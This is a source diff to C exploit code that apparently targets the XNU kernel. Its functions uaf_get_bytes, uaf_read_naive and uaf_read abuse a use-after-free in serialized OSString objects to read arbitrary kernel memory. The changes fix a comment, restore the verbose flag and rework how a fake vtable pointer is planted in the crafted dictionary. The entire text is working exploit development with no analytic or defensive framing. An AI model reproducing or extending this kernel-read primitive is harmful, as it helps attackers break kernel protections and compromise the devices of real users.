@@ -49,7 +49,7 @@ void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
         data[4],                                                        // string pointer
 #endif
 
-        kOSSerializeSymbol | 4,                                         // Name that we're gonne use to retrieve bytes
+        kOSSerializeSymbol | 4,                                         // Name that we're gonna use to retrieve bytes
         *((uint32_t*)ref),
         kOSSerializeObject | 1,                                         // Reference to the overwritten OSString
 
@@ -75,6 +75,7 @@ void uaf_read_naive(const char *addr, char *buf, size_t len)
         .flags = kOSStringNoCopy,                       // and neither the "string" it points to
     };
 
+    bool oldverbose = verbose;
     verbose = false;
     for(size_t off = 0; off < len; off += osstr.length)
     {
@@ -83,7 +84,7 @@ void uaf_read_naive(const char *addr, char *buf, size_t len)
         osstr.string = &addr[off];
         uaf_get_bytes(&osstr, &buf[off], osstr.length);
     }
-    verbose = true;
+    verbose = oldverbose;
 }
 
 #ifdef __LP64__
@@ -117,13 +118,7 @@ void uaf_read(const char *addr, char *buf, size_t len)
 #define DICT_HEAD 8
 #define NUM_CLIENTS 8
 
-    static OSString osstr =
-    {
-        .vtab = NULL,               // Init value
-        .retainCount = 100,         // high ref count -> don't accidentally free this
-        .flags = kOSStringNoCopy,   // don't free or modify the "string"
-    };
-    static const uint32_t *data = (uint32_t*)&osstr;
+    static vtab_t vtab = NULL; // Initial value
     static uint32_t dict[DICT_HEAD + ENT_LEN] =
     {
         /* dict head */
@@ -178,9 +173,10 @@ void uaf_read(const char *addr, char *buf, size_t len)
     DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));
 
     // Once
-    if(osstr.vtab == NULL)
+    if(vtab == NULL)
     {
-        osstr.vtab = (vtab_t)off_vtab();
+        vtab = (vtab_t)off_vtab();
+        uint32_t *data = (uint32_t*)&vtab;
 #ifdef __LP64__
         dict[DICT_HEAD + 11] = dict[DICT_HEAD + (STR_LEN + 1) + 11] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 11] = data[0];
         dict[DICT_HEAD + 12] = dict[DICT_HEAD + (STR_LEN + 1) + 12] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 12] = data[1];
